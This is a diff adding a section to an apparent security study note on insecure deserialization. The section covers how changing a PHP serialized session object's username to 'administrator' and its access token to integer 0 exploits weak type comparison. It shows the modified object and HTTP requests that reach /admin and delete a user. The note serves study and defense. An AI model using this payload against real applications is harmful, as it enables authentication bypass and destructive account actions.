@@ -161,6 +161,7 @@ Cookie: session=MODIFIED_SESSION_COOKIE
 * **Core Concept:** The important issue is not simply that the application uses serialization. The vulnerability occurs because **security-sensitive serialized data is controlled by the client and is trusted after deserialization without sufficient integrity protection or server-side validation**.
 
 * **The Security Impact:** Insecure deserialization of modifiable session objects can lead to privilege escalation, authentication bypass, unauthorized administrative actions, account manipulation, and potentially more severe attacks depending on the capabilities of the serialized object and the deserialization process.
+# Insecure Deserialization
 
 ## Modifying Serialized Data Types
 
@@ -256,4 +257,79 @@ O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
 
 The important changes are:
 
-``
+```text
+s:6:"wiener"
+        |
+        v
+s:13:"administrator"
+```
+
+and:
+
+```text
+s:32:"RANDOM-TOKEN"
+        |
+        v
+i:0
+```
+
+* **The Type Confusion:** The application expects the access token to be a string but receives an integer instead. Under weak comparison behavior in PHP 7.x and earlier, comparisons between different data types can produce unexpected results. This can cause an attacker-controlled value such as `0` to satisfy an authentication check that should require a valid token.
+
+* **The Deserialization Process:** The modified cookie is sent back to the server. The application decodes and deserializes the object, resulting in:
+
+```text
+username = administrator
+access_token = 0
+```
+
+If the authentication check uses a weak comparison, the application may accept the modified object as a valid authenticated session.
+
+* **The Privilege Escalation:**
+
+```text
+Normal User
+    |
+    | Modify serialized object
+    v
+username = administrator
+access_token = integer 0
+    |
+    v
+Weak type comparison
+    |
+    v
+Authentication Bypass
+    |
+    v
+Administrator Account
+```
+
+* **Example Modified Session Object:**
+
+```http
+GET /my-account HTTP/1.1
+Host: target.com
+Cookie: session=MODIFIED_SESSION_COOKIE
+```
+
+The modified session cookie contains the serialized object with the altered username and access-token type.
+
+* **The Administrative Access:** Once the authentication check is bypassed, the application treats the attacker as the `administrator` user and exposes administrative functionality such as `/admin`.
+
+```http
+GET /admin HTTP/1.1
+Host: target.com
+Cookie: session=MODIFIED_SESSION_COOKIE
+```
+
+* **Administrative Action:** Administrative functionality may expose endpoints capable of modifying or deleting other users:
+
+```http
+GET /admin/delete?username=carlos HTTP/1.1
+Host: target.com
+Cookie: session=MODIFIED_SESSION_COOKIE
+```
+
+* **Core Concept:** The important issue is that insecure deserialization can allow an attacker to manipulate not only the **values** stored in a serialized object, but also their **data types**. When this is combined with weak type comparisons, a value of an unexpected type can bypass authentication logic.
+
+* **The Security Impact:** Modifying serialized data types can result in authentication bypass, privilege escalation, unauthorized account access, and administrative actions. Applications should avoid trusting client-controlled serialized objects and should use strict type comparisons and server-side validation for security-sensitive authentication data.
